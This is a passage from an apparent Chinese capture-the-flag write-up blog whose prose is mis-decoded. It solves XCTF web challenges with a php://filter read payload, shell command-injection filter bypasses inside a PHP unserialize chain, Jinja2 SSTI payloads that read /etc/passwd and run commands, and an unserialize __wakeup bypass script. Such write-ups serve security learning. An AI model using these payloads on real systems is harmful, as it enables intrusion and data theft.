<p><code>convert.iconv.UCS-4*.UCS-4BE </code>  &mdash;&gt;  å°†æŒ‡å®šçš„æ–‡ä»¶ä»UCS-4*è½¬æ¢ä¸ºUCS-4BE è¾“å‡º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">phpæ”¯æŒçš„ç¼–ç æ ¼å¼(éƒ¨åˆ†)
</span></span><span class="line"><span class="cl">UCS-4*
</span></span><span class="line"><span class="cl">UCS-4BE
</span></span><span class="line"><span class="cl">UCS-4LE*
</span></span><span class="line"><span class="cl">UCS-2
</span></span><span class="line"><span class="cl">UCS-2BE
</span></span><span class="line"><span class="cl">UCS-2LE
</span></span><span class="line"><span class="cl">UTF-32*
</span></span><span class="line"><span class="cl">UTF-32BE*
</span></span><span class="line"><span class="cl">UTF-32LE*
</span></span><span class="line"><span class="cl">UTF-16*
</span></span><span class="line"><span class="cl">UTF-16BE*
</span></span><span class="line"><span class="cl">UTF-16LE*
</span></span><span class="line"><span class="cl">UTF-7
</span></span><span class="line"><span class="cl">UTF7-IMAP
</span></span><span class="line"><span class="cl">UTF-8*
</span></span><span class="line"><span class="cl">ASCII*
</span></span><span class="line"><span class="cl">EUC-JP*
</span></span><span class="line"><span class="cl">SJIS*
</span></span><span class="line"><span class="cl">eucJP-win*
</span></span><span class="line"><span class="cl">SJIS-win*
</span></span><span class="line"><span class="cl">ISO-2022-JP
</span></span><span class="line"><span class="cl">ISO-2022-JP-MS
</span></span><span class="line"><span class="cl">CP932
</span></span><span class="line"><span class="cl">CP51932
</span></span><span class="line"><span class="cl">SJIS-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰
</span></span><span class="line"><span class="cl">SJIS-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰
</span></span><span class="line"><span class="cl">SJIS-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰
</span></span><span class="line"><span class="cl">SJIS-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰
</span></span><span class="line"><span class="cl">UTF-8-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-8-DOCOMOï¼‰
</span></span><span class="line"><span class="cl">UTF-8-Mobile#KDDI-A
</span></span><span class="line"><span class="cl">UTF-8-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-8-KDDIï¼‰
</span></span><span class="line"><span class="cl">UTF-8-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-8-SOFTBANKï¼‰
</span></span><span class="line"><span class="cl">ISO-2022-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-2022-JP-KDDIï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="unsepingweb">unseping(web)
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ease</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span> <span class="o">=</span> <span class="nv">$method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;ping&#34;</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">ping</span><span class="p">(</span><span class="nv">$ip</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match_all</span><span class="p">(</span><span class="s2">&#34;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&#34;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$pat_array</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;don&#39;t hack&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nv">$ctf</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ååºåˆ—åŒ–æ¼æ´</p>
<p>destructå‡½æ•°ä¼šåœ¨ååºåˆ—åŒ–å‡½æ•°è°ƒç”¨æ—¶è¢«è°ƒç”¨ï¼Œè¦æ±‚ç¬¬ä¸€ä¸ªå‚æ•°å«pingï¼Œç¬¬äºŒä¸ªå‚æ•°ç”±äºcall_user_func_arrayå‡½æ•°æ‰€ä»¥è¦ä¸ºæ•°ç»„array()</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482.png"
	width="1231"
	height="549"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482_hu2965253404311271321.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482_hu2987231565219904431.png 1024w"
	loading="lazy"
	
		alt="image-20250112110342482"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="538px"
	
></p>
<p>ç°åœ¨è€ƒè™‘åœ¨arrayä¸­å¡«å‘½ä»¤è®©ä»–æ‰§è¡Œ</p>
<p>æ³¨æ„æ„é€ æ—¶å¼•å·çš„ç»†èŠ‚ï¼Œå•å¼•å·ä¼šæŠŠä¸­é—´çš„å†…å®¹å®Œå…¨è§†ä¸ºå­—ç¬¦ä¸²ï¼Œä½†åŒå¼•å·ä¼šæŠŠå†…éƒ¨å˜é‡è¿›è¡Œè§£æï¼Œè‹¥åœ¨è¾“å…¥arrayçš„å‚æ•°æ—¶ç”¨åŒå¼•å·ï¼Œä¼šå¯¹${}ä¸­çš„å†…å®¹è¿›è¡Œè§£æå¯¼è‡´payloadæ„é€ å¤±è´¥ã€‚</p>
<p>lsè¢«è¿‡æ»¤æˆ‘ä»¬ç”¨l&quot;&ldquo;sç»•è¿‡,æˆ–è€…åæ–œçº¿ç»•è¿‡l\s</p>
<p>ç›®å½•ä¸‹æœ‰flag_1s_hereæ–‡ä»¶å¤¹ï¼Œflagå¯ä»¥ç”¨f&quot;&ldquo;lagç»•è¿‡ä¹Ÿå¯ä»¥f***</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">l&#34;&#34;s${IFS}f&#34;&#34;lag_1s_here
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›®å½•ä¸‹æœ‰flag_831b69012c67b35f.phpæ–‡ä»¶</p>
<p>catåŒæ ·å¯ä»¥ç”¨c&quot;&ldquo;atç»•è¿‡,phpç”¨p&quot;&ldquo;hpç»•è¿‡,æˆ–è€…æ•´ä¸ªç”¨f*ä»£æ›¿ï¼Œ/è¦ç”¨è¦ç”¨printfåŠ$()ç»•è¿‡</p>
<p>/-&gt;$(printf${IFS}&quot;\57&rdquo;)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c&#34;&#34;at${IFS}f&#34;&#34;lag_1s_here$(printf${IFS}&#34;\57&#34;)f&#34;&#34;lag_831b69012c67b35f.p&#34;&#34;hp
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…ç›´æ¥æ•´ä¸ªç”¨printå’Œ$()ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$(printf${IFS}&#34;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160(cat flag_1s_here/flag_831b69012c67b35f.phpçš„å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶ç¼–ç éƒ½å¯ä»¥)&#34;)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="web_python_template_injectionweb">Web_python_template_injection(web)
</h2><h3 id="ssti">SSTI
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡
</span></span><span class="line"><span class="cl">__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚
</span></span><span class="line"><span class="cl">__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»  // __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨
</span></span><span class="line"><span class="cl">__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•
</span></span><span class="line"><span class="cl">__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¸¸è§payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬æŸ¥æ‰¾os</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">233</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;ip/?name={{&#34;&#34;.__class__.__base__.__subclasses__()[&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;]}}&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="s1">&#39;os._wrap_close&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æŸ¥æ‰¾å±é™©å‡½æ•°
</span></span><span class="line"><span class="cl">ä¾‹å¦‚eval
</span></span><span class="line"><span class="cl">æ‹¼æ¥é”®å€¼
</span></span><span class="line"><span class="cl">[&#34;__builtins__&#34;][&#39;eval&#39;]
</span></span><span class="line"><span class="cl">æ‰§è¡Œå‘½ä»¤
</span></span><span class="line"><span class="cl">(&#39;__import__(&#34;os&#34;).popen(&#34;id&#34;).read()&#39;)
</span></span><span class="line"><span class="cl">åœ¨popenä¸­æ¥æ‰§è¡Œå‘½ä»¤
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜å…ˆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰ä¸€ä¸ªtypefileç±»å‹,ç”¨äºæ–‡ä»¶è¯»å–ï¼ˆä½ç½®åœ¨40ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() }}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æœ‰ä¸€ä¸ª&lt;class &lsquo;site._printer&rsquo;&gt;ç±»å‹ï¼ˆä½ç½®åœ¨71ï¼‰ï¼Œç”¨äºå‘½ä»¤æ‰§è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].listdir(&#39;.&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°f14g</p>
<p>ç”¨æ–‡ä»¶è¯»å–å‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;fl4g&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="å®˜æ–¹wp">å®˜æ–¹WP
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å…ˆæŸ¥çœ‹æ‰€æœ‰æ¨¡å—
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()}}
</span></span><span class="line"><span class="cl">osæ¨¡å—éƒ½æ˜¯ä»warnings.catch_warningsæ¨¡å—å…¥æ‰‹çš„ï¼Œåœ¨æ‰€æœ‰æ¨¡å—ä¸­æŸ¥æ‰¾catch_warningsçš„ä½ç½®ï¼ˆ59ï¼‰
</span></span><span class="line"><span class="cl">æŸ¥çœ‹catch_warningsæ¨¡å—éƒ½å­˜åœ¨å“ªäº›å…¨å±€å‡½æ•°ï¼Œå¯ä»¥æ‰¾åˆ°linecacheå‡½æ•°ï¼Œosæ¨¡å—å°±åœ¨å…¶ä¸­
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}
</span></span><span class="line"><span class="cl">ä½¿ç”¨[&#39;o&#39;+&#39;s&#39;],å¯ç»•è¿‡å¯¹oså­—ç¬¦çš„è¿‡æ»¤
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)}}æŸ¥æ‰¾åˆ°flag
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[2].__subclasses__()[40](&#34;fl4g&#34;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="web_php_unserializeweb">Web_php_unserialize(web)
</h2><p>é¦–å…ˆå¾—ç»•è¿‡æ­£åˆ™åŒ¹é…</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490.png"
	width="416"
	height="36"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490_hu7905391521995938062.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490_hu4556472256560916946.png 1024w"
	loading="lazy"
	
		alt="image-20250112153945490"
	
	
		class="gallery-image" 
		data-flex-grow="1155"
		data-flex-basis="2773px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/i è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™
</span></span><span class="line"><span class="cl">\d åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [0-9]ã€‚
</span></span><span class="line"><span class="cl">â€œ+â€ å‡ºç°è‡³å°‘1æ¬¡
</span></span><span class="line"><span class="cl">[ ] æ˜¯å®šä¹‰åŒ¹é…çš„å­—ç¬¦èŒƒå›´
</span></span><span class="line"><span class="cl">[oc]æ˜¯åŒ¹é…oæˆ–cä»»æ„ä¸€ä¸ª
</span></span><span class="line"><span class="cl">[xyz] å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜[abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„ â€˜aâ€™ã€‚
</span></span><span class="line"><span class="cl">\d+æ˜¯ä¸ºäº†åŒ¹é…[0-9]çš„æ•°å­—ï¼Œå¤šæ¬¡åŒ¹é…ï¼
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°±æ˜¯æƒ³è¿‡æ»¤o:4,æˆ‘ä»¬ç”¨o:+4ç»•è¿‡</p>
<p>wakeupæˆå‘˜æ•°åŠ ä¸€å°±è¡Œ</p>
<p>è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Demo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="o">@</span><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">!=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//the secret is in the fl4g.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Demo</span><span class="p">(</span><span class="s1">&#39;fl4g.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//echo $a;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$str1</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;O:4&#39;</span><span class="p">,</span> <span class="s1">&#39;O:+4&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span><span class="c1">//ç»•è¿‡preg_match
